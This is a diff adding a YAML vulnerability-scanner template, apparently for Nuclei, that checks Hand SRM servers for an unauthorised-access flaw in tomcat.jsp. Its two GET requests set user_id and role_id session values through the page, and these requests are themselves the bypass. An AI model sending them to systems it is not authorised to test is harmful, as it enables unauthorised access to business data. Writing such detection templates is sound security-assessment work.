@@ -1,0 +1,31 @@
+id: hand-tomcat-unauthorized
+info:
+  name: 汉得 SRM tomcat.jsp - 未授权访问漏洞
+  author: EASY
+  severity: high
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E6%B1%89%E5%BE%97/%E6%B1%89%E5%BE%97SRM%20tomcat.jsp%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: hand
+    product: srm
+  tags: unauth,vuln,hand,tomcat
+flow: http(1) && http(2)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/tomcat.jsp?dataName=user_id&dataValue=1'
+    redirects: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "SRM SERVER Info") && contains(body, "user_id =")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/tomcat.jsp?dataName=role_id&dataValue=1'
+    redirects: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "SRM SERVER Info") && contains(body, "role_id =")'
